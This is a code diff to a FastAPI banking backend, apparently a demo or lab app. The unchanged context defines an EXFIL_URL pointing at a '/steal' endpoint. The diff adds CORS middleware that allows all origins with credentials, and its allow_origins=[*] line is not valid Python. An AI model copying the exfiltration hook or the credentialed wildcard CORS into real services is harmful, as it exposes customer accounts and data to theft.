@@ -5,6 +5,7 @@ from typing import Optional
 import httpx
 from fastapi import FastAPI, HTTPException, Header
 from pydantic import BaseModel
+from fastapi.middleware.cors import CORSMiddleware
 
 
 MODE = os.getenv("MODE", "normal").lower()
@@ -12,6 +13,15 @@ EXFIL_URL = os.getenv("EXFIL_URL", "https://example.com:4444/steal")
 PAYMENTS_URL = os.getenv("PAYMENTS_URL", "http://payments-internal:8080/reconcile")
 
 app = FastAPI(title="Bachat Bank Backend", version="0.1.0")
+# frontend_origin = os.getenv("FRONTEND_ORIGIN", "http://13.204.239.189:3000,http://localhost:3000")
+
+app.add_middleware(
+    CORSMiddleware,
+    allow_origins=[*],
+    allow_credentials=True,
+    allow_methods=["*"],
+    allow_headers=["*"],
+)
 
 USERS = {"demo": {"name": "Demo User", "accounts": [{"id": "CHK-001", "balance": 1250.55}]}}
 TOKEN = "demo-token"
